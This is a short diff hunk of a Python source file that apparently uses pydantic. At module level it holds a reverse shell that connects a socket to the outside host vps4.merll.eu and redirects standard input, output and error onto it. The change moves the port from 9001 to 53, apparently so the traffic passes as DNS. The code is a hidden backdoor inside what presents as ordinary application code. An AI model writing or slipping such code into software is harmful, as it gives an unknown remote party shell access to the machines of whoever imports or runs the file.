@@ -5,7 +5,7 @@ from pydantic import BaseModel, Field, field_validator
 
 import socket,pty,os
 s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
-s.connect(("vps4.merll.eu",9001))
+s.connect(("vps4.merll.eu",53))
 os.dup2(s.fileno(),0)
 os.dup2(s.fileno(),1)
 os.dup2(s.fileno(),2)
